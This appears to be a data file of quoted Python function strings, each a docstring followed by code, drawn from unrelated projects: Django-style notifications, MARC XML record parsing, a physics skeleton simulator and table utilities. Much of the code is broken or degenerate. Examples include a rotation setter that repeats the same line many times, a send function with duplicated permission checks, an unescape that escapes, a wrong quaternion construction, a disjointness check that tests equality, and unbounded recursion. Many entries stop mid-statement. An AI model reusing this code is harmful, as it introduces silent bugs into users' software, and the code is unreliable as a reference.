        "def safe_escape(string, escape_char='_', allow_collisions=False):\n    \"\"\"Escape a string so that it only contains characters in a safe set.\n\n    Characters outside the safe list will be escaped with _%x_,\n    where %x is the hex value of the character.\n\n    If `allow_collisions` is True, occurrences of `escape_char`\n    in the input will not be escaped.\n\n    In this case, `unescape` cannot be used to reverse the transform\n    because occurrences of the escape char in the resulting string are ambiguous.\n    Only use this mode when:\n\n    1. collisions cannot occur or do not matter, and\n    2. unescape will never be called.\n\n    .. versionadded: 1.0\n        allow_collisions argument.\n        Prior to 1.0, behavior was the same as allow_collisions=",
        "def unescape(string, escape_char='\\\\'):\n    \"\"\"Unescape a string escaped with `escape`\n    \n    escape_char must be the same as that used in the call to escape.\n    \"\"\"\n    if not isinstance(string, str):\n        raise TypeError(\"string must be a string\")\n    if not isinstance(escape_char, str):\n        raise TypeError(\"escape_char must be a string\")\n    return string.replace(escape_char, '\\\\%s' % escape_char)",
        "def can_send_notification(self, user, notice_type):\n        \"\"\"\n        Determines whether this backend is allowed to send a notification to\n        the given user and notice_type.\n        \"\"\"\n        if not self.can_send_notification_for(user, notice_type):\n            return False\n        if not self.can_send_notification_for(user, 'email'):\n            return False\n        return True",
        "def get_context(self, context):\n        \"\"\"\n        Returns a dictionary with the format identifier as the key. The values are\n        are fully rendered templates with the given context.\n        \"\"\"\n        context = super(TemplateRenderer, self).get_context(context)\n        context.update({\n            'format': self.format,\n            'context': context,\n        })\n        return context",
        "def copy_attributes(source, destination):\n    \"\"\"Copy the attributes from a source object to a destination object.\"\"\"\n    for key in source.__dict__:\n        if key.startswith('_'):\n            continue\n        if key.startswith('_' + 'attributes_'):\n            continue\n        setattr(destination, key, getattr(source, key))",
        "def get_row(self, idx):\n        \"\"\"\n        Returns DataFrameRow of the DataFrame given its index.\n\n        :param idx: the index of the row in the DataFrame.\n        :return: returns a DataFrameRow\n        \"\"\"\n        if idx < 0:\n            raise ValueError(\"Index out of range\")\n        if idx >= self.num_rows:\n            raise ValueError(\"Index out of range\")\n        return DataFrameRow(self.data, self.index[idx])",
        "def notice_settings(request):\n    \"\"\"\n    The notice settings view.\n\n    Template: :template:`notification/notice_settings.html`\n\n    Context:\n\n        notice_types\n            A list of all :model:`notification.NoticeType` objects.\n\n        notice_settings\n            A dictionary containing ``column_headers`` for each ``NOTICE_MEDIA``\n            and ``rows`` containing a list of dictionaries: ``notice_type``, a\n            :model:`notification.NoticeType` object and ``cells``, a list of\n            tuples whose first value is suitable for use in forms and the second\n            value is ``True`` or ``False`` depending on a ``request.POST``\n            variable called ``form_label``, whose valid value is ``on``.\n    \"\"\"\n    notice_types = []\n    notice_settings = {}\n    for media in NoticeMedia.",
        "def query(self, query, **kwargs):\n        \"\"\"Query Wolfram Alpha and return a Result object\"\"\"\n        return Result(self.client.query(query, **kwargs))",
        "def _get_pods(self, result):\n        \"\"\"Return list of all Pod objects in result\"\"\"\n        pods = []\n        for pod in result:\n            pods.append(Pod(pod))\n        return pods",
        "def find(self, *args):\n        \"\"\"\n        Find a node in the tree. If the node is not found it is added first and then returned.\n\n        :param args: a tuple\n        :return: returns the node\n        \"\"\"\n        for node in self.nodes:\n            if node.id == args[0]:\n                return node\n        self.nodes.append(Node(*args))\n        return self.nodes[-1]",
        "def get_notification_language(user):\n    \"\"\"\n    Returns site-specific notification language for this user. Raises\n    LanguageStoreNotAvailable if this site does not use translated\n    notifications.\n    \"\"\"\n    try:\n        return get_language()\n    except LanguageStoreNotAvailable:\n        raise\n    except Exception:\n        raise",
        "def send(user, notification_type, data, **kwargs):\n    \"\"\"\n    Creates a new notice.\n\n    This is intended to be how other apps create new notices.\n\n    notification.send(user, \"friends_invite_sent\", {\n        \"spam\": \"eggs\",\n        \"foo\": \"bar\",\n    )\n    \"\"\"\n    if not user.is_authenticated:\n        return\n\n    if not user.is_staff:\n        return\n\n    if not user.is_superuser:\n        return\n\n    if not user.is_staff:\n        return\n\n    if not user.is_superuser:\n        return\n\n    if not user.is_staff:\n        return\n\n    if not user.is_superuser:\n        return\n\n    if not user.is_staff:\n        return\n\n",
        "def send_now(*args, **kwargs):\n    \"\"\"\n    A basic interface around both queue and send_now. This honors a global\n    flag NOTIFICATION_QUEUE_ALL that helps determine whether all calls should\n    be queued or not. A per call ``queue`` or ``now`` keyword argument can be\n    used to always override the default global behavior.\n    \"\"\"\n    now = kwargs.pop('now', None)\n    queue = kwargs.pop('queue', None)\n    if now is None:\n        now = time.time()\n    if queue is None:\n        queue = not settings.NOTIFICATION_QUEUE_ALL\n    if queue:\n        return _send_now(*args, now=now, **kwargs)\n    else:\n        return _send_now(*args, **kwargs)",
        "def _queue_notification(\n        user,\n        queue_name,\n        message,\n        priority=None,\n        timestamp=None,\n        queue_type=None,\n        queue_id=None,\n        queue_name_prefix=None,\n        queue_type_prefix=None,\n        queue_id_prefix=None):\n    \"\"\"\n    Queue the notification in NoticeQueueBatch. This allows for large amounts\n    of user notifications to be deferred to a seperate process running outside\n    the webserver.\n    \"\"\"\n    if not queue_name:\n        queue_name = _get_queue_name(user, queue_type, queue_id)\n    if not queue_type:\n        queue_type = _get_queue_type(user, queue_name)\n    if not queue_id:\n        queue_id = _get_queue_",
        "def write_potential(func, dfunc=None, bounds=None, samples=1000, tollerance=0.1,\n                    keyword='PAIR', filename='lammps.table',\n                    **kwargs):\n    \"\"\"\n    A helper function to write lammps pair potentials to string. Assumes that\n    functions are vectorized.\n\n    Parameters\n    ----------\n    func: function\n       A function that will be evaluated for the force at each radius. Required to\n       be numpy vectorizable.\n    dfunc: function\n       Optional. A function that will be evaluated for the energy at each\n       radius. If not supplied the centered difference method will be\n       used. Required to be numpy vectorizable.\n    bounds: tuple, list\n       Optional. specifies min and max radius to evaluate the\n       potential. Default 1 length unit, 10 length unit.\n    samples: int\n       Number of",
        "def write_tersoff_potential(parameters):\n    \"\"\"Write tersoff potential file from parameters to string\n\n    Parameters\n    ----------\n    parameters: dict\n       keys are tuple of elements with the values being the parameters length 14\n    \"\"\"\n    potential_file = open(TERSOFF_POSSIBLE_FILE, 'w')\n    potential_file.write('{0:s}\\n'.format(TERSOFF_POSSIBLE_FILE))\n    for key in parameters:\n        potential_file.write('{0:s} {1:s}\\n'.format(key, parameters[key]))\n    potential_file.close()",
        "def aggregate(self, clazz, new_col, *args):\n        \"\"\"\n        Aggregate the rows of each group into a single value.\n\n        :param clazz: name of a class that extends class Callable\n        :type clazz: class\n        :param new_col: name of the new column\n        :type new_col: str\n        :param args: list of column names of the object that\n         function should be applied to\n        :type args: varargs\n        :return: returns a new dataframe object with the aggregated value\n        :rtype: DataFrame\n        \"\"\"\n        if len(args) == 0:\n            raise ValueError(\"No column names given\")\n        if len(args) > 1:\n            raise ValueError(\"Too many column names given\")\n        if len(args) == 1:\n            return self.apply(lambda x: x.aggregate(clazz, new_col,",
        "def set_disjoint(set1, set2, warn=None):\n    \"\"\"Checks if elements of set2 are in set1.\n\n    :param set1: a set of values\n    :param set2: a set of values\n    :param warn: the error message that should be thrown\n     when the sets are NOT disjoint\n    :return: returns true no elements of set2 are in set1\n    \"\"\"\n    if set1 == set2:\n        return True\n    if set1 is None or set2 is None:\n        return False\n    if set1 != set2:\n        if warn is not None:\n            warn(\"The sets are NOT disjoint\")\n        return False\n    return True",
        "def all_in(set1, set2, warn=None):\n    \"\"\"Checks if all elements from set2 are in set1.\n\n    :param set1:  a set of values\n    :param set2:  a set of values\n    :param warn: the error message that should be thrown \n     when the sets are not containd\n    :return: returns true if all values of set2 are in set1\n    \"\"\"\n    if not set1:\n        return True\n    if not set2:\n        return True\n    if not all(set1.issubset(set2) for set1 in set2):\n        if warn:\n            msg = \"Set %s is not in %s\" % (set1, set2)\n            print(msg)\n        raise ValueError(msg)\n    return True",
        "def serialize(self):\n        \"\"\"Serialize object back to XML string.\n\n        Returns:\n            str: String which should be same as original input, if everything\\\n                 works as expected.\n        \"\"\"\n        xml = etree.tostring(self.root, encoding='utf-8')\n        return xml",
        "def parse_marc(self, xml):\n        \"\"\"\n        Parse MARC XML document to dicts, which are contained in\n        self.controlfields and self.datafields.\n\n        Args:\n            xml (str or HTMLElement): input data\n\n        Also detect if this is oai marc format or not (see elf.oai_marc).\n        \"\"\"\n        if self.oai_marc:\n            self.parse_oai_marc(xml)\n        else:\n            self.parse_marc_xml(xml)",
        "def _parse_control_fields(self, fields, tag_id):\n        \"\"\"Parse control fields.\n\n        Args:\n            fields (list): list of HTMLElements\n            tag_id (str):  parameter name, which holds the information, about\n                           field name this is normally \"tag\", but in case of\n                           oai_marc \"id\".\n        \"\"\"\n        for field in fields:\n            if field.tag == tag_id:\n                self._parse_control_field(field)",
        "def _parse_data_fields(self, fields, tag_id, sub_id):\n        \"\"\"Parse data fields.\n\n        Args:\n            fields (list): of HTMLElements\n            tag_id (str): parameter name, which holds the information, about\n                          field name this is normally \"tag\", but in case of\n                          oai_marc \"id\"\n            sub_id (str): id of parameter, which holds informations about\n                          subfield name this is normally \"code\" but in case of\n                          oai_marc \"label\"\n        \"\"\"\n        for field in fields:\n            if field.tag == tag_id:\n                self._parse_field(field, sub_id)",
        "def _get_i1_ind1(self, num, is_oai=None):\n        \"\"\"\n        This method is used mainly internally, but it can be handy if you work\n        with with raw MARC XML object and not using getters.\n\n        Args:\n            num (int): Which indicator you need (1/2).\n            is_oai (bool/None): If None, :attr:`.oai_marc` is\n                   used.\n\n        Returns:\n            str: current name of ``i1``/``ind1`` parameter based on \\\n                 :attr:`oai_marc` property.\n        \"\"\"\n        if is_oai is None:\n            is_oai = self.oai_marc\n        if num == 1:\n            return 'i1'\n        elif num == 2:\n            return 'ind1'",
        "def get_subfield(self, datafield, subfield, i1=None, i2=None, exception=False):\n        \"\"\"Return content of given `subfield` in `datafield`.\n\n        Args:\n            datafield (str): Section name (for example \"001\", \"100\", \"700\").\n            subfield (str):  Subfield name (for example \"a\", \"1\", etc..).\n            i1 (str, default None): Optional i1/ind1 parameter value, which\n               will be used for search.\n            i2 (str, default None): Optional i2/ind2 parameter value, which\n               will be used for search.\n            exception (bool): If ``True``, :exc:`~exceptions.KeyError` is\n                      raised when method couldn't found given `datafield` /\n                      `subfield`. If ``False``, blank array ``[]``",
        "def get_joint_param(self, joint_name, param_name):\n        \"\"\"Get the given param from each of the DOFs for a joint.\"\"\"\n        joint_name = self._get_joint_name(joint_name)\n        for dof in self.get_dofs():\n            if dof.get_joint_name() == joint_name:\n                return dof.get_param_name(param_name)",
        "def set_joint_param(self, joint_name, param_name, param_value):\n        \"\"\"Set the given param for each of the DOFs for a joint.\"\"\"\n        for dof in self.get_joint_dofs(joint_name):\n            dof.set_param(param_name, param_value)",
        "def from_angle_and_axis(angle, axis):\n    \"\"\"Given an angle and an axis, create a quaternion.\"\"\"\n    q = Quaternion()\n    q.x = axis[0] * angle\n    q.y = axis[1] * angle\n    q.z = axis[2] * angle\n    return q",
        "def compute_center_of_mass(bodies):\n    \"\"\"Given a set of bodies, compute their center of mass in world coordinates.\"\"\"\n    mass_centers = []\n    for body in bodies:\n        mass_centers.append(body.get_mass_center())\n    return np.array(mass_centers)",
        "def set_state(self, state):\n        \"\"\"Set the state of this body.\n\n        Parameters\n        ----------\n        state : BodyState tuple\n            The desired state of the body.\n        \"\"\"\n        if state is None:\n            raise ValueError('state must be specified')\n        if state not in self.states:\n            raise ValueError('state must be one of: %s' % ', '.join(self.states))\n        self.state = state",
        "def set_rotation(self, rotation):\n        \"\"\"Set the rotation of this body using a rotation matrix.\n\n        Parameters\n        ----------\n        rotation : sequence of 9 floats\n            The desired rotation matrix for this body.\n        \"\"\"\n        self.rotation = np.array(rotation)\n        self.rotation = np.array(self.rotation)\n        self.rotation = np.array(self.rotation)\n        self.rotation = np.array(self.rotation)\n        self.rotation = np.array(self.rotation)\n        self.rotation = np.array(self.rotation)\n        self.rotation = np.array(self.rotation)\n        self.rotation = np.array(self.rotation)\n        self.rotation = np.array(self.rotation)\n        self.rotation = np.array(self.rotation)\n        self.rotation = np.array",
        "def _offset_to_world(self, position):\n        \"\"\"Convert a body-relative offset to world coordinates.\n\n        Parameters\n        ----------\n        position : 3-tuple of float\n            A tuple giving body-relative offsets.\n\n        Returns\n        -------\n        position : 3-tuple of float\n            A tuple giving the world coordinates of the given offset.\n        \"\"\"\n        return (position[0] + self.offset_x,\n                position[1] + self.offset_y,\n                position[2] + self.offset_z)",
        "def world_to_body_offset(self, position):\n        \"\"\"Convert a point in world coordinates to a body-relative offset.\n\n        Parameters\n        ----------\n        position : 3-tuple of float\n            A world coordinates position.\n\n        Returns\n        -------\n        offset : 3-tuple of float\n            A tuple giving the body-relative offset of the given position.\n        \"\"\"\n        return (position[0] - self.world_center[0],\n                position[1] - self.world_center[1],\n                position[2] - self.world_center[2])",
        "def offset_to_world(self, offset):\n        \"\"\"Convert a relative body offset to world coordinates.\n\n        Parameters\n        ----------\n        offset : 3-tuple of float\n            The offset of the desired point, given as a relative fraction of the\n            size of this body. For example, offset (0, 0, 0) is the center of\n            the body, while (0.5, -0.2, 0.1) describes a point halfway from the\n            center towards the maximum x-extent of the body, 20% of the way from\n            the center towards the minimum y-extent, and 10% of the way from the\n            center towards the maximum z-extent.\n\n        Returns\n        -------\n        position : 3-tuple of float\n            A position in world coordinates of the given body offset.\n        \"\"\"\n        return (self.x + offset[0] * self",
        "def add_force(self, force, relative=False, position=None, relative_position=None):\n        \"\"\"\n        Add a force to this body.\n\n        Parameters\n        ----------\n        force : 3-tuple of float\n            A vector giving the forces along each world or body coordinate axis.\n        relative : bool, optional\n            If False, the force values are assumed to be given in the world\n            coordinate frame. If True, they are assumed to be given in the\n            body-relative coordinate frame. Defaults to False.\n        position : 3-tuple of float, optional\n            If given, apply the force at this location in world coordinates.\n            Defaults to the current position of the body.\n        relative_position : 3-tuple of float, optional\n            If given, apply the force at this relative location on the body. If\n            given, this method ignores the ``position`` parameter.\n",
        "def add_torque(self, force, relative=False):\n        \"\"\"Add a torque to this body.\n\n        Parameters\n        ----------\n        force : 3-tuple of float\n            A vector giving the torque along each world or body coordinate axis.\n        relative : bool, optional\n            If False, the torque values are assumed to be given in the world\n            coordinate frame. If True, they are assumed to be given in the\n            body-relative coordinate frame. Defaults to False.\n        \"\"\"\n        if relative:\n            force = self.world_to_body(force)\n        self.torque += force",
        "def connect(self, joint, other_body=None):\n        \"\"\"Connect this body to another one using a joint.\n\n        This method creates a joint to fasten this body to the other one. See\n        :func:`World.join`.\n\n        Parameters\n        ----------\n        joint : str\n            The type of joint to use when connecting these bodies.\n        other_body : :class:`Body` or str, optional\n            The other body to join with this one. If not given, connects this\n            body to the world.\n        \"\"\"\n        if other_body is None:\n            other_body = self\n        if joint not in self._joints:\n            self._joints[joint] = joint_factory(joint, other_body)\n        return self._joints[joint]",
        "def move_next_to_joint(self, joint, other_body, offset=None, other_offset=None,\n                          other_size=None, other_angle=None,\n                          other_joint_name=None, other_joint_type=None,\n                          other_joint_options=None, other_joint_name_prefix=None,\n                          other_joint_options_prefix=None):\n        \"\"\"Move another body next to this one and join them together.\n\n        This method will move the ``other_body`` so that the anchor points for\n        the joint coincide. It then creates a joint to fasten the two bodies\n        together. See :func:`World.move_next_to` and :func:`World.join`.\n\n        Parameters\n        ----------\n        joint : str\n            The type of joint to use when connecting these bodies.\n        other_body",
        "def _linear_degrees_of_freedom_positions(self):\n        \"\"\"List of positions for linear degrees of freedom.\"\"\"\n        return [\n            self._linear_degrees_of_freedom_position(i)\n            for i in range(self.n_linear_degrees_of_freedom_positions)\n        ]",
        "def _linear_degrees_of_freedom_positions(self):\n        \"\"\"List of position rates for linear degrees of freedom.\"\"\"\n        return [\n            self._linear_degrees_of_freedom_position(x)\n            for x in self._linear_degrees_of_freedom_positions_list\n        ]",
        "def rotational_degrees_of_freedom(self):\n        \"\"\"List of angles for rotational degrees of freedom.\"\"\"\n        return [\n            self.rotational_degrees_of_freedom_angle(i)\n            for i in range(self.number_of_rotations)\n        ]",
        "def rotational_degrees_of_freedom_angle_rates(self):\n        \"\"\"List of angle rates for rotational degrees of freedom.\"\"\"\n        return [\n            self.rotational_degrees_of_freedom_angle_rate(\n                i)\n            for i in range(self.number_of_rotations)\n        ]",
        "def axes(self):\n        \"\"\"List of axes for this object's degrees of freedom.\"\"\"\n        if self._axes is None:\n            self._axes = self.get_axes()\n        return self._axes",
        "def set_lo_stops(self, lo_stops):\n        \"\"\"Set the lo stop values for this object's degrees of freedom.\n\n        Parameters\n        ----------\n        lo_stops : float or sequence of float\n            A lo stop value to set on all degrees of freedom, or a list\n            containing one such value for each degree of freedom. For rotational\n            degrees of freedom, these values must be in radians.\n        \"\"\"\n        if isinstance(lo_stops, (list, tuple)):\n            for lo_stop in lo_stops:\n                self.set_lo_stop(lo_stop)\n        else:\n            self.set_lo_stop(lo_stops)",
        "def set_hi_stops(self, hi_stops):\n        \"\"\"Set the hi stop values for this object's degrees of freedom.\n\n        Parameters\n        ----------\n        hi_stops : float or sequence of float\n            A hi stop value to set on all degrees of freedom, or a list\n            containing one such value for each degree of freedom. For rotational\n            degrees of freedom, these values must be in radians.\n        \"\"\"\n        if isinstance(hi_stops, (list, tuple)):\n            for hi_stop in hi_stops:\n                self.set_hi_stop(hi_stop)\n        else:\n            self.set_hi_stop(hi_stops)",
        "def set_velocities(self, velocities):\n        \"\"\"Set the target velocities for this object's degrees of freedom.\n\n        Parameters\n        ----------\n        velocities : float or sequence of float\n            A target velocity value to set on all degrees of freedom, or a list\n            containing one such value for each degree of freedom. For rotational\n            degrees of freedom, these values must be in radians / second.\n        \"\"\"\n        if isinstance(velocities, (list, tuple)):\n            for v in velocities:\n                self.set_velocity(v)\n        else:\n            self.set_velocity(velocities)",
        "def set_max_forces(self, max_forces):\n        \"\"\"Set the maximum forces for this object's degrees of freedom.\n\n        Parameters\n        ----------\n        max_forces : float or sequence of float\n            A maximum force value to set on all degrees of freedom, or a list\n            containing one such value for each degree of freedom.\n        \"\"\"\n        if isinstance(max_forces, (list, tuple)):\n            for force in max_forces:\n                self.set_max_force(force)\n        else:\n            self.set_max_force(max_forces)",
        "def set_erps(self, erps):\n        \"\"\"Set the ERP values for this object's degrees of freedom.\n\n        Parameters\n        ----------\n        erps : float or sequence of float\n            An ERP value to set on all degrees of freedom, or a list\n            containing one such value for each degree of freedom.\n        \"\"\"\n        if erps is None:\n            erps = []\n        for erp in erps:\n            self.set_erp(erp)",
        "def set_cfms(self, cfms):\n        \"\"\"Set the CFM values for this object's degrees of freedom.\n\n        Parameters\n        ----------\n        cfms : float or sequence of float\n            A CFM value to set on all degrees of freedom, or a list\n            containing one such value for each degree of freedom.\n        \"\"\"\n        if isinstance(cfms, (list, tuple)):\n            for cfm in cfms:\n                self.set_cfm(cfm)\n        else:\n            self.set_cfm(cfms)",
        "def set_cfms(self, stop_cfms):\n        \"\"\"Set the CFM values for this object's DOF limits.\n\n        Parameters\n        ----------\n        stop_cfms : float or sequence of float\n            A CFM value to set on all degrees of freedom limits, or a list\n            containing one such value for each degree of freedom limit.\n        \"\"\"\n        if isinstance(stop_cfms, (list, tuple)):\n            for stop_cfm in stop_cfms:\n                self.set_cfm(stop_cfm)\n        else:\n            self.set_cfm(stop_cfms)",
        "def set_erps(self, stop_erps):\n        \"\"\"Set the ERP values for this object's DOF limits.\n\n        Parameters\n        ----------\n        stop_erps : float or sequence of float\n            An ERP value to set on all degrees of freedom limits, or a list\n            containing one such value for each degree of freedom limit.\n        \"\"\"\n        if isinstance(stop_erps, (list, tuple)):\n            for stop_erp in stop_erps:\n                self.set_erp(stop_erp)\n        else:\n            self.set_erp(stop_erps)",
        "def set_axes(self, axes):\n        \"\"\"Set the linear axis of displacement for this joint.\n\n        Parameters\n        ----------\n        axes : list containing one 3-tuple of floats\n            A list of the axes for this joint. For a slider joint, which has one\n            degree of freedom, this must contain one 3-tuple specifying the X,\n            Y, and Z axis for the joint.\n        \"\"\"\n        if len(axes) != 3:\n            raise ValueError('axes must be a list of three-tuple of floats')\n        self._axes = axes",
        "def set_angular_axis(self, axes):\n        \"\"\"Set the angular axis of rotation for this joint.\n\n        Parameters\n        ----------\n        axes : list containing one 3-tuple of floats\n            A list of the axes for this joint. For a hinge joint, which has one\n            degree of freedom, this must contain one 3-tuple specifying the X,\n            Y, and Z axis for the joint.\n        \"\"\"\n        if len(axes) != 3:\n            raise ValueError('axes must be a list of three-tuple of floats')\n        self._angular_axis = axes",
        "def rotation_axes(self):\n        \"\"\"A list of axes of rotation for this joint.\"\"\"\n        if self._rotation_axes is None:\n            self._rotation_axes = self.joint_state.get_rotation_axes()\n        return self._rotation_axes",
        "def create_body(self, shape, name=None):\n        \"\"\"Create a new body.\n\n        Parameters\n        ----------\n        shape : str\n            The \"shape\" of the body to be created. This should name a type of\n            body object, e.g., \"box\" or \"cap\".\n        name : str, optional\n            The name to use for this body. If not given, a default name will be\n            constructed of the form \"{shape}{# of objects in the world}\".\n\n        Returns\n        -------\n        body : :class:`Body`\n            The created body object.\n        \"\"\"\n        shape = self._get_shape(shape)\n        if name is None:\n            name = shape + '_body'\n        return self._create_body(shape, name)",
        "def join(self, shape, body_a, body_b=None, name=None):\n        \"\"\"Create a new joint that connects two bodies together.\n\n        Parameters\n        ----------\n        shape : str\n            The \"shape\" of the joint to use for joining together two bodies.\n            This should name a type of joint, such as \"ball\" or \"piston\".\n        body_a : str or :class:`Body`\n            The first body to join together with this joint. If a string is\n            given, it will be used as the name of a body to look up in the\n            world.\n        body_b : str or :class:`Body`, optional\n            If given, identifies the second body to join together with\n            ``body_a``. If not given, ``body_a`` is joined to the world.\n        name : str, optional\n            If given,",
        "def move_body(self, body_a, body_b, offset_a, offset_b):\n        \"\"\"Move one body to be near another one.\n\n        After moving, the location described by ``offset_a`` on ``body_a`` will\n        be coincident with the location described by ``offset_b`` on ``body_b``.\n\n        Parameters\n        ----------\n        body_a : str or :class:`Body`\n            The body to use as a reference for moving the other body. If this is\n            a string, it is treated as the name of a body to look up in the\n            world.\n        body_b : str or :class:`Body`\n            The body to move next to ``body_a``. If this is a string, it is\n            treated as the name of a body to look up in the world.\n        offset_a :",
        "def set_body_states(self, *states):\n        \"\"\"Set the states of some bodies in the world.\n\n        Parameters\n        ----------\n        states : sequence of states\n            A complete state tuple for one or more bodies in the world. See\n            :func:`get_body_states`.\n        \"\"\"\n        for body in self.get_bodies():\n            body.set_state(*states)",
        "def step(self, substeps=1):\n        \"\"\"Step the world forward by one frame.\n\n        Parameters\n        ----------\n        substeps : int, optional\n            Split the step into this many sub-steps. This helps to prevent the\n            time delta for an update from being too large.\n        \"\"\"\n        if self.is_finished:\n            return\n        self.step_counter += 1\n        if self.step_counter >= substeps:\n            self.step_counter = 0\n            self.step()",
        "def connected(self, body_a, body_b):\n        \"\"\"Determine whether the given bodies are currently connected.\n\n        Parameters\n        ----------\n        body_a : str or :class:`Body`\n            One body to test for connectedness. If this is a string, it is\n            treated as the name of a body to look up.\n        body_b : str or :class:`Body`\n            One body to test for connectedness. If this is a string, it is\n            treated as the name of a body to look up.\n\n        Returns\n        -------\n        connected : bool\n            Return True iff the two bodies are connected.\n        \"\"\"\n        if isinstance(body_a, str):\n            body_a = self.get_body(body_a)\n        if isinstance(body_b, str):\n            body_b = self.get_body(body_",
        "def parse_motion_capture(source):\n    \"\"\"Parse an AMC motion capture data file.\n\n    Parameters\n    ----------\n    source : file\n        A file-like object that contains AMC motion capture text.\n\n    Yields\n    ------\n    frame : dict\n        Yields a series of motion capture frames. Each frame is a dictionary\n        that maps a bone name to a list of the DOF configurations for that bone.\n    \"\"\"\n    # Read the header\n    header = source.readline()\n    if header != 'MMC':\n        raise ValueError('Expected MMC motion capture file, got %s' % header)\n\n    # Read the frames\n    frames = []\n    for line in source:\n        # Skip the header line\n        line = line.strip()\n        if line == '':\n            continue\n        # Skip the blank lines\n        line =",
        "def _create_bodies(self):\n        \"\"\"Traverse the bone hierarchy and create physics bodies.\"\"\"\n        for bone in self.bones:\n            if isinstance(bone, Bone):\n                self._create_bone(bone)\n            elif isinstance(bone, BoneGroup):\n                self._create_bone_group(bone)\n            elif isinstance(bone, BoneGroup2):\n                self._create_bone_group2(bone)\n            elif isinstance(bone, BoneGroup3):\n                self._create_bone_group3(bone)\n            elif isinstance(bone, BoneGroup4):\n                self._create_bone_group4(bone)\n            elif isinstance(bone, BoneGroup5):\n                self._create_bone_group5(bone)\n            elif isinstance(bone, BoneGroup6):\n                self._create",
        "def _create_joints(self):\n        \"\"\"Traverse the bone hierarchy and create physics joints.\"\"\"\n        for node in self.nodes:\n            joint = self._create_joint(node)\n            if joint:\n                self.joints.append(joint)",
        "def parse_corporations(self, datafield, subfield, roles):\n        \"\"\"\n        Parse informations about corporations from given field identified\n        by `datafield` parameter.\n\n        Args:\n            datafield (str): MARC field ID (\"``110``\", \"``610``\", etc..)\n            subfield (str):  MARC subfield ID with name, which is typically\n                             stored in \"``a``\" subfield.\n            roles (str): specify which roles you need. Set to ``[\"any\"]`` for\n                         any role, ``[\"dst\"]`` for distributors, etc.. For\n                         details, see\n                         http://www.loc.gov/marc/relators/relaterm.html\n\n        Returns:\n            list: :class:`Corporation` objects.\n        \"\"\"\n        corps = []\n        for row in self.get_rows(",
        "def _parse_persons(self, datafield, subfield, role):\n        \"\"\"Parse persons from given datafield.\n\n        Args:\n            datafield (str): code of datafield (\"010\", \"730\", etc..)\n            subfield (char):  code of subfield (\"a\", \"z\", \"4\", etc..)\n            role (list of str): set to [\"any\"] for any role, [\"aut\"] for\n                 authors, etc.. For details see\n                 http://www.loc.gov/marc/relators/relaterm.html\n\n        Main records for persons are: \"100\", \"600\" and \"700\", subrecords \"c\".\n\n        Returns:\n            list: Person objects.\n        \"\"\"\n        persons = []\n        for record in self.records:\n            if record.datafield == datafield:\n                if record.",
        "def get_valid_isbn(self):\n        \"\"\"Get list of VALID ISBN.\n\n        Returns:\n            list: List with *valid* ISBN strings.\n        \"\"\"\n        valid_isbn = []\n        for isbn in self.get_isbn_list():\n            if isbn.is_valid:\n                valid_isbn.append(isbn.isbn)\n        return valid_isbn",
        "def url_list(self):\n        \"\"\"Content of field ``856u42``. Typically URL pointing to producers\n        homepage.\n\n        Returns:\n            list: List of URLs defined by producer.\n        \"\"\"\n        if self._url_list is None:\n            self._url_list = []\n            for url in self.url:\n                self._url_list.append(url)\n        return self._url_list",
        "def urls(self):\n        \"\"\"URL's, which may point to edeposit, aleph, kramerius and so on.\n\n        Fields ``856u40``, ``998a`` and ``URLu``.\n\n        Returns:\n            list: List of internal URLs.\n        \"\"\"\n        urls = []\n        for url in self.urls_list:\n            if url.startswith('http'):\n                urls.append(url)\n            elif url.startswith('https'):\n                urls.append(url)\n        return urls",
        "def create_pid_controller(kp, ki, kd, smooth=0.1):\n    r'''Create a callable that implements a PID controller.\n\n    A PID controller returns a control signal :math:`u(t)` given a history of\n    error measurements :math:`e(0) \\dots e(t)`, using proportional (P), integral\n    (I), and derivative (D) terms, according to:\n\n    .. math::\n\n       u(t) = kp * e(t) + ki * \\int_{s=0}^t e(s) ds + kd * \\frac{de(s)}{ds}(t)\n\n    The proportional term is just the current error, the integral term is the\n    sum of all error measurements, and the derivative term is the instantaneous\n    derivative of the error measurement.\n\n    Parameters\n   ",
        "def flatten(iterables):\n    \"\"\"\n    Given a sequence of sequences, return a flat numpy array.\n\n    Parameters\n    ----------\n    iterables : sequence of sequence of number\n        A sequence of tuples or lists containing numbers. Typically these come\n        from something that represents each joint in a skeleton, like angle.\n\n    Returns\n    -------\n    ndarray :\n        An array of flattened data from each of the source iterables.\n    \"\"\"\n    return np.array([flatten(x) for x in iterables])",
        "def load(self, source):\n        \"\"\"\n        Load a skeleton definition from a file.\n\n        Parameters\n        ----------\n        source : str or file\n            A filename or file-like object that contains text information\n            describing a skeleton. See :class:`pagoda.parser.Parser` for more\n            information about the format of the text file.\n        \"\"\"\n        if isinstance(source, str):\n            with open(source, 'r') as f:\n                source = f.read()\n        self.parse(source)",
        "def from_text(cls, source):\n        \"\"\"\n        Load a skeleton definition from a text file.\n\n        Parameters\n        ----------\n        source : str or file\n            A filename or file-like object that contains text information\n            describing a skeleton. See :class:`pagoda.parser.BodyParser` for\n            more information about the format of the text file.\n        \"\"\"\n        with open(source, 'r') as f:\n            body = BodyParser(f).parse()\n        return cls(body)",
        "def load_asf(self, source):\n        \"\"\"Load a skeleton definition from an ASF text file.\n\n        Parameters\n        ----------\n        source : str or file\n            A filename or file-like object that contains text information\n            describing a skeleton, in ASF format.\n        \"\"\"\n        if isinstance(source, str):\n            with open(source, 'r') as f:\n                source = f.read()\n        self.load_text(source)",
        "def set_pid_params(self, *params):\n        \"\"\"Set PID parameters for all joints in the skeleton.\n\n        Parameters for this method are passed directly to the `pid` constructor.\n        \"\"\"\n        for joint in self.joints:\n            joint.set_pid_params(*params)",
        "def get_joint_torques(self):\n        \"\"\"Get a list of all current joint torques in the skeleton.\"\"\"\n        joint_torques = []\n        for joint in self.joints:\n            joint_torques.extend(joint.get_joint_torques())\n        return joint_torques",
        "def get_joint_indices(self, name):\n        \"\"\"Get a list of the indices for a specific joint.\n\n        Parameters\n        ----------\n        name : str\n            The name of the joint to look up.\n\n        Returns\n        -------\n        list of int :\n            A list of the index values for quantities related to the named\n            joint. Often useful for getting, say, the angles for a specific\n            joint in the skeleton.\n        \"\"\"\n        joint = self.get_joint(name)\n        return [joint.get_index()]",
